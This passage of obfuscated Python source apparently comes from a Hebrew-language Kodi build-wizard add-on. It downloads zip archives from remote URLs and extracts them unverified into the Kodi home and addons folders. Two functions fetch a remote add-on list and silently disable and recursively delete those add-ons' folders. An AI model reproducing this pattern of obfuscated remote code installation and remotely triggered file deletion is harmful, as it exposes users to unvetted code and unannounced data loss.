			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OOOO00OO0OO000O0O ),xbmc .LOGNOTICE )#line:5173
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5174
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5175
def checkidupdate ():#line:5181
				wiz .setS ("notedismiss","true")#line:5183
				OO0O0O0OOOOOOO0O0 =wiz .workingURL (NOTIFICATION )#line:5184
				O0O0O0O0OOOO0OOOO =" Kodi Premium"#line:5186
				OO00000OO00O00OOO =wiz .checkBuild (O0O0O0O0OOOO0OOOO ,'gui')#line:5187
				O00OO000O00O0000O =O0O0O0O0OOOO0OOOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5188
				if not wiz .workingURL (OO00000OO00O00OOO )==True :return #line:5189
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5190
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0O0O0O0OOOO0OOOO ),'','אנא המתן')#line:5191
				O000O00O0O00000O0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00OO000O00O0000O )#line:5192
				try :os .remove (O000O00O0O00000O0 )#line:5193
				except :pass #line:5194
				logging .warning (OO00000OO00O00OOO )#line:5195
				if 'google'in OO00000OO00O00OOO :#line:5196
				   O0OOO00O0O00OOO00 =googledrive_download (OO00000OO00O00OOO ,O000O00O0O00000O0 ,DP ,wiz .checkBuild (O0O0O0O0OOOO0OOOO ,'filesize'))#line:5197
				else :#line:5200
				  downloader .download (OO00000OO00O00OOO ,O000O00O0O00000O0 ,DP )#line:5201
				xbmc .sleep (100 )#line:5202
				O00O0O0OOO0O000OO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0O0O0OOOO0OOOO )#line:5203
				DP .update (0 ,O00O0O0OOO0O000OO ,'','אנא המתן')#line:5204
				extract .all (O000O00O0O00000O0 ,HOME ,DP ,title =O00O0O0OOO0O000OO )#line:5205
				DP .close ()#line:5206
				wiz .defaultSkin ()#line:5207
				wiz .lookandFeelData ('save')#line:5208
				if KODIV >=18 :#line:5209
					skindialogsettind18 ()#line:5210
				if INSTALLMETHOD ==1 :O00OOOOO0OO000O0O =1 #line:5213
				elif INSTALLMETHOD ==2 :O00OOOOO0OO000O0O =0 #line:5214
				else :DP .close ()#line:5215
def gaiaserenaddon ():#line:5217
  OOOO0000OOO0000O0 =(ADDON .getSetting ("gaiaseren"))#line:5218
  O00O00OOO0O00O000 =(ADDON .getSetting ("auto_rd"))#line:5219
  if OOOO0000OOO0000O0 =='true'and O00O00OOO0O00O000 =='true':#line:5220
    OOOOOO00O00OO0OOO =(NEWFASTUPDATE )#line:5221
    O00OOO0O00OOO0OOO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5222
    O00O0OO00O0000O00 =xbmcgui .DialogProgress ()#line:5223
    O00O0OO00O0000O00 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5224
    OO0OOOO0O0O00O0O0 =os .path .join (PACKAGES ,'isr.zip')#line:5225
    OO000OOOO0OOOOOOO =urllib2 .Request (OOOOOO00O00OO0OOO )#line:5226
    OO0O0OOOO00O0OOO0 =urllib2 .urlopen (OO000OOOO0OOOOOOO )#line:5227
    OO000OOO000O000OO =xbmcgui .DialogProgress ()#line:5229
    OO000OOO000O000OO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5230
    OO000OOO000O000OO .update (0 )#line:5231
    OOOOOOO0OOO00OO0O =open (OO0OOOO0O0O00O0O0 ,'wb')#line:5233
    try :#line:5235
      O0O00OOO0000OOO0O =OO0O0OOOO00O0OOO0 .info ().getheader ('Content-Length').strip ()#line:5236
      O0000O0OO0OOO000O =True #line:5237
    except AttributeError :#line:5238
          O0000O0OO0OOO000O =False #line:5239
    if O0000O0OO0OOO000O :#line:5241
          O0O00OOO0000OOO0O =int (O0O00OOO0000OOO0O )#line:5242
    OOO0O0O0000OOOO00 =0 #line:5244
    OO00000O000OOO0OO =time .time ()#line:5245
    while True :#line:5246
          O0OO0O00OOO0OOOO0 =OO0O0OOOO00O0OOO0 .read (8192 )#line:5247
          if not O0OO0O00OOO0OOOO0 :#line:5248
              sys .stdout .write ('\n')#line:5249
              break #line:5250
          OOO0O0O0000OOOO00 +=len (O0OO0O00OOO0OOOO0 )#line:5252
          OOOOOOO0OOO00OO0O .write (O0OO0O00OOO0OOOO0 )#line:5253
          if not O0000O0OO0OOO000O :#line:5255
              O0O00OOO0000OOO0O =OOO0O0O0000OOOO00 #line:5256
          if OO000OOO000O000OO .iscanceled ():#line:5257
             OO000OOO000O000OO .close ()#line:5258
             try :#line:5259
              os .remove (OO0OOOO0O0O00O0O0 )#line:5260
             except :#line:5261
              pass #line:5262
             break #line:5263
          O0OOOOO0O0OOOO00O =float (OOO0O0O0000OOOO00 )/O0O00OOO0000OOO0O #line:5264
          O0OOOOO0O0OOOO00O =round (O0OOOOO0O0OOOO00O *100 ,2 )#line:5265
          O00OO0O0O000OO0O0 =OOO0O0O0000OOOO00 /(1024 *1024 )#line:5266
          OO00OOOOOO0OO0OO0 =O0O00OOO0000OOO0O /(1024 *1024 )#line:5267
          O0O0OOO00O00O0000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O00OO0O0O000OO0O0 ,'teal',OO00OOOOOO0OO0OO0 )#line:5268
          if (time .time ()-OO00000O000OOO0OO )>0 :#line:5269
            OOO0OO000OOOOOOO0 =OOO0O0O0000OOOO00 /(time .time ()-OO00000O000OOO0OO )#line:5270
            OOO0OO000OOOOOOO0 =OOO0OO000OOOOOOO0 /1024 #line:5271
          else :#line:5272
           OOO0OO000OOOOOOO0 =0 #line:5273
          O00O000OO0OO0OO0O ='KB'#line:5274
          if OOO0OO000OOOOOOO0 >=1024 :#line:5275
             OOO0OO000OOOOOOO0 =OOO0OO000OOOOOOO0 /1024 #line:5276
             O00O000OO0OO0OO0O ='MB'#line:5277
          if OOO0OO000OOOOOOO0 >0 and not O0OOOOO0O0OOOO00O ==100 :#line:5278
              O0OO000O000000000 =(O0O00OOO0000OOO0O -OOO0O0O0000OOOO00 )/OOO0OO000OOOOOOO0 #line:5279
          else :#line:5280
              O0OO000O000000000 =0 #line:5281
          O0OO0O00OO0O0OOO0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO0OO000OOOOOOO0 ,O00O000OO0OO0OO0O )#line:5282
          OO000OOO000O000OO .update (int (O0OOOOO0O0OOOO00O ),O0O0OOO00O00O0000 ,O0OO0O00OO0O0OOO0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5284
    O000OOO0O0000O000 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5287
    OOOOOOO0OOO00OO0O .close ()#line:5290
    extract .all (OO0OOOO0O0O00O0O0 ,O000OOO0O0000O000 ,OO000OOO000O000OO )#line:5291
    try :#line:5295
      os .remove (OO0OOOO0O0O00O0O0 )#line:5296
    except :#line:5297
      pass #line:5298
def iptvsimpldownpc ():#line:5299
    O000000O00OO0O000 =(IPTVSIMPL18PC )#line:5301
    OOO00OOOO0OO0O0OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5302
    OOO0O00OO0000000O =xbmcgui .DialogProgress ()#line:5303
    OOO0O00OO0000000O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5304
    OOOOOOO000O000OO0 =os .path .join (PACKAGES ,'isr.zip')#line:5305
    O000OOOO00OO0O0OO =urllib2 .Request (O000000O00OO0O000 )#line:5306
    OOOOO0OO0O0000OOO =urllib2 .urlopen (O000OOOO00OO0O0OO )#line:5307
    OO0O000O00O00OO00 =xbmcgui .DialogProgress ()#line:5309
    OO0O000O00O00OO00 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5310
    OO0O000O00O00OO00 .update (0 )#line:5311
    O00OO0OOO0OO00OO0 =open (OOOOOOO000O000OO0 ,'wb')#line:5313
    try :#line:5315
      O00O0000O00OO0O0O =OOOOO0OO0O0000OOO .info ().getheader ('Content-Length').strip ()#line:5316
      O0OO000OO0000O0O0 =True #line:5317
    except AttributeError :#line:5318
          O0OO000OO0000O0O0 =False #line:5319
    if O0OO000OO0000O0O0 :#line:5321
          O00O0000O00OO0O0O =int (O00O0000O00OO0O0O )#line:5322
    O000000O000O0O00O =0 #line:5324
    O00O0O0O0O0OO0OO0 =time .time ()#line:5325
    while True :#line:5326
          O0OO0000OOO0OOOOO =OOOOO0OO0O0000OOO .read (8192 )#line:5327
          if not O0OO0000OOO0OOOOO :#line:5328
              sys .stdout .write ('\n')#line:5329
              break #line:5330
          O000000O000O0O00O +=len (O0OO0000OOO0OOOOO )#line:5332
          O00OO0OOO0OO00OO0 .write (O0OO0000OOO0OOOOO )#line:5333
          if not O0OO000OO0000O0O0 :#line:5335
              O00O0000O00OO0O0O =O000000O000O0O00O #line:5336
          if OO0O000O00O00OO00 .iscanceled ():#line:5337
             OO0O000O00O00OO00 .close ()#line:5338
             try :#line:5339
              os .remove (OOOOOOO000O000OO0 )#line:5340
             except :#line:5341
              pass #line:5342
             break #line:5343
          OO00OO0O000OO0OO0 =float (O000000O000O0O00O )/O00O0000O00OO0O0O #line:5344
          OO00OO0O000OO0OO0 =round (OO00OO0O000OO0OO0 *100 ,2 )#line:5345
          O0OO0O0O0OO0OOOOO =O000000O000O0O00O /(1024 *1024 )#line:5346
          O00000O00O00O0OO0 =O00O0000O00OO0O0O /(1024 *1024 )#line:5347
          OOOOOOOO0OOO000O0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OO0O0O0OO0OOOOO ,'teal',O00000O00O00O0OO0 )#line:5348
          if (time .time ()-O00O0O0O0O0OO0OO0 )>0 :#line:5349
            OOOO0OOOO0O0000OO =O000000O000O0O00O /(time .time ()-O00O0O0O0O0OO0OO0 )#line:5350
            OOOO0OOOO0O0000OO =OOOO0OOOO0O0000OO /1024 #line:5351
          else :#line:5352
           OOOO0OOOO0O0000OO =0 #line:5353
          OOO000OOOO0OOOO00 ='KB'#line:5354
          if OOOO0OOOO0O0000OO >=1024 :#line:5355
             OOOO0OOOO0O0000OO =OOOO0OOOO0O0000OO /1024 #line:5356
             OOO000OOOO0OOOO00 ='MB'#line:5357
          if OOOO0OOOO0O0000OO >0 and not OO00OO0O000OO0OO0 ==100 :#line:5358
              OOOO0O0O0O0O000O0 =(O00O0000O00OO0O0O -O000000O000O0O00O )/OOOO0OOOO0O0000OO #line:5359
          else :#line:5360
              OOOO0O0O0O0O000O0 =0 #line:5361
          OOO000OO0000OOO0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOO0OOOO0O0000OO ,OOO000OOOO0OOOO00 )#line:5362
          OO0O000O00O00OO00 .update (int (OO00OO0O000OO0OO0 ),OOOOOOOO0OOO000O0 ,OOO000OO0000OOO0O +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5364
    O00OO0OO0000000O0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5367
    O00OO0OOO0OO00OO0 .close ()#line:5370
    extract .all (OOOOOOO000O000OO0 ,O00OO0OO0000000O0 ,OO0O000O00O00OO00 )#line:5371
    try :#line:5375
      os .remove (OOOOOOO000O000OO0 )#line:5376
    except :#line:5377
      pass #line:5378
def iptvsimpldown ():#line:5379
    O00OO000O0000O0O0 =(IPTV18 )#line:5381
    OO00O0O0OO0OOO0OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5382
    O0O00O0OO00O00OO0 =xbmcgui .DialogProgress ()#line:5383
    O0O00O0OO00O00OO0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5384
    OOO0O0O0OO00O0O00 =os .path .join (PACKAGES ,'isr.zip')#line:5385
    O00OOOO0OOOO0O000 =urllib2 .Request (O00OO000O0000O0O0 )#line:5386
    O000O0OO0OOO00000 =urllib2 .urlopen (O00OOOO0OOOO0O000 )#line:5387
    O000000000O00O000 =xbmcgui .DialogProgress ()#line:5389
    O000000000O00O000 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5390
    O000000000O00O000 .update (0 )#line:5391
    O0OOO000O0O000O00 =open (OOO0O0O0OO00O0O00 ,'wb')#line:5393
    try :#line:5395
      OOO0O0OOOO0O00000 =O000O0OO0OOO00000 .info ().getheader ('Content-Length').strip ()#line:5396
      O0O0O00OOOO0O0OO0 =True #line:5397
    except AttributeError :#line:5398
          O0O0O00OOOO0O0OO0 =False #line:5399
    if O0O0O00OOOO0O0OO0 :#line:5401
          OOO0O0OOOO0O00000 =int (OOO0O0OOOO0O00000 )#line:5402
    OOOO00000000OOOO0 =0 #line:5404
    OOO00OO0O0OO00O0O =time .time ()#line:5405
    while True :#line:5406
          O0OO0OOO0OO0OOO0O =O000O0OO0OOO00000 .read (8192 )#line:5407
          if not O0OO0OOO0OO0OOO0O :#line:5408
              sys .stdout .write ('\n')#line:5409
              break #line:5410
          OOOO00000000OOOO0 +=len (O0OO0OOO0OO0OOO0O )#line:5412
          O0OOO000O0O000O00 .write (O0OO0OOO0OO0OOO0O )#line:5413
          if not O0O0O00OOOO0O0OO0 :#line:5415
              OOO0O0OOOO0O00000 =OOOO00000000OOOO0 #line:5416
          if O000000000O00O000 .iscanceled ():#line:5417
             O000000000O00O000 .close ()#line:5418
             try :#line:5419
              os .remove (OOO0O0O0OO00O0O00 )#line:5420
             except :#line:5421
              pass #line:5422
             break #line:5423
          O00OOOOOOOO000000 =float (OOOO00000000OOOO0 )/OOO0O0OOOO0O00000 #line:5424
          O00OOOOOOOO000000 =round (O00OOOOOOOO000000 *100 ,2 )#line:5425
          O0000OOOO0O0O0000 =OOOO00000000OOOO0 /(1024 *1024 )#line:5426
          O0O00OO0000OO0OOO =OOO0O0OOOO0O00000 /(1024 *1024 )#line:5427
          OO0OOO00OO0OO0OO0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0000OOOO0O0O0000 ,'teal',O0O00OO0000OO0OOO )#line:5428
          if (time .time ()-OOO00OO0O0OO00O0O )>0 :#line:5429
            O00OOO00O00OO0OO0 =OOOO00000000OOOO0 /(time .time ()-OOO00OO0O0OO00O0O )#line:5430
            O00OOO00O00OO0OO0 =O00OOO00O00OO0OO0 /1024 #line:5431
          else :#line:5432
           O00OOO00O00OO0OO0 =0 #line:5433
          OO0OO0000O0OOO000 ='KB'#line:5434
          if O00OOO00O00OO0OO0 >=1024 :#line:5435
             O00OOO00O00OO0OO0 =O00OOO00O00OO0OO0 /1024 #line:5436
             OO0OO0000O0OOO000 ='MB'#line:5437
          if O00OOO00O00OO0OO0 >0 and not O00OOOOOOOO000000 ==100 :#line:5438
              OOO000OO0O0O00OO0 =(OOO0O0OOOO0O00000 -OOOO00000000OOOO0 )/O00OOO00O00OO0OO0 #line:5439
          else :#line:5440
              OOO000OO0O0O00OO0 =0 #line:5441
          OOO0OOOOO0OO0O00O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00OOO00O00OO0OO0 ,OO0OO0000O0OOO000 )#line:5442
          O000000000O00O000 .update (int (O00OOOOOOOO000000 ),OO0OOO00OO0OO0OO0 ,OOO0OOOOO0OO0O00O +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5444
    O00O0OO0OO0000OO0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5447
    O0OOO000O0O000O00 .close ()#line:5450
    extract .all (OOO0O0O0OO00O0O00 ,O00O0OO0OO0000OO0 ,O000000000O00O000 )#line:5451
    try :#line:5455
      os .remove (OOO0O0O0OO00O0O00 )#line:5456
    except :#line:5457
      pass #line:5458
def testnotify ():#line:5459
	OOOOO00O0OOO00O00 =wiz .workingURL (NOTIFICATION )#line:5460
	if OOOOO00O0OOO00O00 ==True :#line:5461
		try :#line:5462
			O00O0OO00OOOO0O0O ,OOOO000O0O0000O0O =wiz .splitNotify (NOTIFICATION )#line:5463
			if O00O0OO00OOOO0O0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5464
			if STARTP2 ()=='ok':#line:5465
				notify .notification (OOOO000O0O0000O0O ,True )#line:5466
		except Exception as O00000OO0OOO000OO :#line:5467
			wiz .log ("Error on Notifications Window: %s"%str (O00000OO0OOO000OO ),xbmc .LOGERROR )#line:5468
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5469
def testnotify2 ():#line:5470
	O0OO0O0O0O0O000OO =wiz .workingURL (NOTIFICATION2 )#line:5471
	if O0OO0O0O0O0O000OO ==True :#line:5472
		try :#line:5473
			OO00OOO00000O0O00 ,O000OO0O00OO00OO0 =wiz .splitNotify (NOTIFICATION2 )#line:5474
			if OO00OOO00000O0O00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5475
			if STARTP2 ()=='ok':#line:5476
				notify .notification2 (O000OO0O00OO00OO0 ,True )#line:5477
		except Exception as O00O00O000OO00O0O :#line:5478
			wiz .log ("Error on Notifications Window: %s"%str (O00O00O000OO00O0O ),xbmc .LOGERROR )#line:5479
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5480
def testnotify3 ():#line:5481
	OO000O0O0OOOOO0O0 =wiz .workingURL (NOTIFICATION3 )#line:5482
	if OO000O0O0OOOOO0O0 ==True :#line:5483
		try :#line:5484
			OOOOO0O00OOOO0OOO ,OO0O0O000O0OO0O00 =wiz .splitNotify (NOTIFICATION3 )#line:5485
			if OOOOO0O00OOOO0OOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5486
			if STARTP2 ()=='ok':#line:5487
				notify .notification3 (OO0O0O000O0OO0O00 ,True )#line:5488
		except Exception as O00OOO00OOOOO0OOO :#line:5489
			wiz .log ("Error on Notifications Window: %s"%str (O00OOO00OOOOO0OOO ),xbmc .LOGERROR )#line:5490
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5491
def wait ():#line:5492
 wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אנא המתן[/COLOR]"%COLOR2 )#line:5493
def infobuild ():#line:5494
	O0OO0O0000O000000 =wiz .workingURL (NOTIFICATION )#line:5495
	if O0OO0O0000O000000 ==True :#line:5496
		try :#line:5497
			O00O0O0OO0O0000OO ,OOO0O0OOO0OOOO00O =wiz .splitNotify (NOTIFICATION )#line:5498
			if O00O0O0OO0O0000OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5499
			if STARTP2 ()=='ok':#line:5500
				notify .updateinfo (OOO0O0OOO0OOOO00O ,True )#line:5501
		except Exception as OO0O0OOOOOO00OO00 :#line:5502
			wiz .log ("Error on Notifications Window: %s"%str (OO0O0OOOOOO00OO00 ),xbmc .LOGERROR )#line:5503
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5504
def servicemanual ():#line:5505
	OOO000O0O000O0OO0 =wiz .workingURL (HELPINFO )#line:5506
	if OOO000O0O000O0OO0 ==True :#line:5507
		try :#line:5508
			O00OOOOO0OO0000OO ,OO0O0OOO0O00O0000 =wiz .splitNotify (HELPINFO )#line:5509
			if O00OOOOO0OO0000OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5510
			notify .helpinfo (OO0O0OOO0O00O0000 ,True )#line:5511
		except Exception as O00O000OOO0000O0O :#line:5512
			wiz .log ("Error on Notifications Window: %s"%str (O00O000OOO0000O0O ),xbmc .LOGERROR )#line:5513
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5514
def testupdate ():#line:5516
	if BUILDNAME =="":#line:5517
		notify .updateWindow ()#line:5518
	else :#line:5519
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5520
def testfirst ():#line:5522
	notify .firstRun ()#line:5523
def testfirstRun ():#line:5525
	notify .firstRunSettings ()#line:5526
def fastinstall ():#line:5529
	notify .firstRuninstall ()#line:5530
def addDir (O000OO0O0OO0O0OOO ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5537
	OOOO0O0O00OOOOOO0 =sys .argv [0 ]#line:5538
	if not mode ==None :OOOO0O0O00OOOOOO0 +="?mode=%s"%urllib .quote_plus (mode )#line:5539
	if not name ==None :OOOO0O0O00OOOOOO0 +="&name="+urllib .quote_plus (name )#line:5540
	if not url ==None :OOOO0O0O00OOOOOO0 +="&url="+urllib .quote_plus (url )#line:5541
	OOO0O0OO00OOOOO0O =True #line:5542
	if themeit :O000OO0O0OO0O0OOO =themeit %O000OO0O0OO0O0OOO #line:5543
	OOO00000O0O00O000 =xbmcgui .ListItem (O000OO0O0OO0O0OOO ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5544
	OOO00000O0O00O000 .setInfo (type ="Video",infoLabels ={"Title":O000OO0O0OO0O0OOO ,"Plot":description })#line:5545
	OOO00000O0O00O000 .setProperty ("Fanart_Image",fanart )#line:5546
	if not menu ==None :OOO00000O0O00O000 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5547
	OOO0O0OO00OOOOO0O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOOO0O0O00OOOOOO0 ,listitem =OOO00000O0O00O000 ,isFolder =True )#line:5548
	return OOO0O0OO00OOOOO0O #line:5549
def addFile (OOOOOO0O0O000OOOO ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5551
	O0OOO0OO000OOO00O =sys .argv [0 ]#line:5552
	if not mode ==None :O0OOO0OO000OOO00O +="?mode=%s"%urllib .quote_plus (mode )#line:5553
	if not name ==None :O0OOO0OO000OOO00O +="&name="+urllib .quote_plus (name )#line:5554
	if not url ==None :O0OOO0OO000OOO00O +="&url="+urllib .quote_plus (url )#line:5555
	OOO0O0000O0OO0O00 =True #line:5556
	if themeit :OOOOOO0O0O000OOOO =themeit %OOOOOO0O0O000OOOO #line:5557
	O0OO00O0000O0O00O =xbmcgui .ListItem (OOOOOO0O0O000OOOO ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5558
	O0OO00O0000O0O00O .setInfo (type ="Video",infoLabels ={"Title":OOOOOO0O0O000OOOO ,"Plot":description })#line:5559
	O0OO00O0000O0O00O .setProperty ("Fanart_Image",fanart )#line:5560
	if not menu ==None :O0OO00O0000O0O00O .addContextMenuItems (menu ,replaceItems =overwrite )#line:5561
	OOO0O0000O0OO0O00 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0OOO0OO000OOO00O ,listitem =O0OO00O0000O0O00O ,isFolder =False )#line:5562
	return OOO0O0000O0OO0O00 #line:5563
def get_params ():#line:5565
	OOO0OOOO0O0OOO00O =[]#line:5566
	OO000O0OOOOO000O0 =sys .argv [2 ]#line:5567
	if len (OO000O0OOOOO000O0 )>=2 :#line:5568
		O0OO0OO0000OOO0O0 =sys .argv [2 ]#line:5569
		O00OO000000OO00OO =O0OO0OO0000OOO0O0 .replace ('?','')#line:5570
		if (O0OO0OO0000OOO0O0 [len (O0OO0OO0000OOO0O0 )-1 ]=='/'):#line:5571
			O0OO0OO0000OOO0O0 =O0OO0OO0000OOO0O0 [0 :len (O0OO0OO0000OOO0O0 )-2 ]#line:5572
		OOO00OOO00O000O00 =O00OO000000OO00OO .split ('&')#line:5573
		OOO0OOOO0O0OOO00O ={}#line:5574
		for O0000O0O0O0OO0O00 in range (len (OOO00OOO00O000O00 )):#line:5575
			O00O0OOO00OOOO0O0 ={}#line:5576
			O00O0OOO00OOOO0O0 =OOO00OOO00O000O00 [O0000O0O0O0OO0O00 ].split ('=')#line:5577
			if (len (O00O0OOO00OOOO0O0 ))==2 :#line:5578
				OOO0OOOO0O0OOO00O [O00O0OOO00OOOO0O0 [0 ]]=O00O0OOO00OOOO0O0 [1 ]#line:5579
		return OOO0OOOO0O0OOO00O #line:5581
def remove_addons ():#line:5583
	try :#line:5584
			import json #line:5585
			OO0O0O0O0OOO00OO0 =urllib2 .urlopen (remove_url ).readlines ()#line:5586
			for O0O00OOOOOO0O0OOO in OO0O0O0O0OOO00OO0 :#line:5587
				OO0O0O000O0OO0000 =O0O00OOOOOO0O0OOO .split (':')[1 ].strip ()#line:5589
				OO00O0OO00000OO00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(OO0O0O000O0OO0000 ,'false')#line:5590
				O0O000000O0O0OO0O =xbmc .executeJSONRPC (OO00O0OO00000OO00 )#line:5591
				OO000O0OOO000O0O0 =json .loads (O0O000000O0O0OO0O )#line:5592
				O00OO0OO0000OO0O0 =os .path .join (addons_folder ,OO0O0O000O0OO0000 )#line:5594
				if os .path .exists (O00OO0OO0000OO0O0 ):#line:5596
					for OO0O0O00O0O0000OO ,OO0000OO00000O0O0 ,OOO00O0O0000OO000 in os .walk (O00OO0OO0000OO0O0 ):#line:5597
						for OOOOOOO000OOO0O0O in OOO00O0O0000OO000 :#line:5598
							os .unlink (os .path .join (OO0O0O00O0O0000OO ,OOOOOOO000OOO0O0O ))#line:5599
						for OOO0O0O0O00OOOOO0 in OO0000OO00000O0O0 :#line:5600
							shutil .rmtree (os .path .join (OO0O0O00O0O0000OO ,OOO0O0O0O00OOOOO0 ))#line:5601
					os .rmdir (O00OO0OO0000OO0O0 )#line:5602
			xbmc .executebuiltin ('Container.Refresh')#line:5604
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5605
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5606
	except :pass #line:5607
def remove_addons2 ():#line:5608
	try :#line:5609
			import json #line:5610
			OOOOOO000O00000OO =urllib2 .urlopen (remove_url2 ).readlines ()#line:5611
			for O00O00OO00O0OO000 in OOOOOO000O00000OO :#line:5612
				O0OOOOO0O00O0O0O0 =O00O00OO00O0OO000 .split (':')[1 ].strip ()#line:5614
				OOOOOOO00OOOO0OO0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(O0OOOOO0O00O0O0O0 ,'false')#line:5615
				O000O0OO00OOOOO00 =xbmc .executeJSONRPC (OOOOOOO00OOOO0OO0 )#line:5616
				OOOOO000OOOOO0O0O =json .loads (O000O0OO00OOOOO00 )#line:5617
				O000OO0O0O000000O =os .path .join (user_folder ,O0OOOOO0O00O0O0O0 )#line:5619
				if os .path .exists (O000OO0O0O000000O ):#line:5621
					for O0OO00000O00O0O0O ,OOOOOOOO0O0O0O000 ,O00000O00O0000OO0 in os .walk (O000OO0O0O000000O ):#line:5622
						for O000O000O00O0000O in O00000O00O0000OO0 :#line:5623
							os .unlink (os .path .join (O0OO00000O00O0O0O ,O000O000O00O0000O ))#line:5624
						for O0O0O00O0O00000O0 in OOOOOOOO0O0O0O000 :#line:5625
							shutil .rmtree (os .path .join (O0OO00000O00O0O0O ,O0O0O00O0O00000O0 ))#line:5626
					os .rmdir (O000OO0O0O000000O )#line:5627
	except :pass #line:5629
params =get_params ()#line:5630
url =None #line:5631
name =None #line:5632
mode =None #line:5633
try :mode =urllib .unquote_plus (params ["mode"])#line:5635
except :pass #line:5636
